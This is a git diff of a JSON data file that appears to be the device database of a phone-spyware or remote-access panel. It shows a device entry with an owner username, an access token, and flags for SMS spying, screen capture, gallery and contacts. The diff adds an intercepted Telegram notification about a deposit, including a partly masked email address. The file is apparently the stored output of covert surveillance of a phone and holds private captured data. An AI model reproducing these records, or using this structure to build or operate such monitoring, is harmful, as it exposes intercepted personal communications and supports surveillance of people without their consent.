@@ -21195,7 +21195,7 @@
     "deviceName": "HP-REQ-5DAA",
     "ownerUsername": "ardan",
     "token": "3183356a7839b953b40d625bf68e5d54",
-    "lastSeen": 1775377862544,
+    "lastSeen": 1775377878446,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-05T08:30:07.651Z",
@@ -21210,7 +21210,16 @@
     "lastPhoto": null,
     "lastScreenFrame": null,
     "smsSpyActive": true,
-    "smsMessages": [],
+    "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "RuangOTP - Notification",
+        "content": "💰 DEPOSIT SUKSES\n\n👤 User: yog***@gmail.com\n💵 Jumlah: Rp 5.000\n💳 Metode: qris\n✅ Status: SUCCESS\n\n#Deposit #RuangOTP",
+        "time": "05/04 15:29",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1775377880745
+      }
+    ],
     "galleryPhotos": [],
     "galleryDone": false,
     "contacts": [],
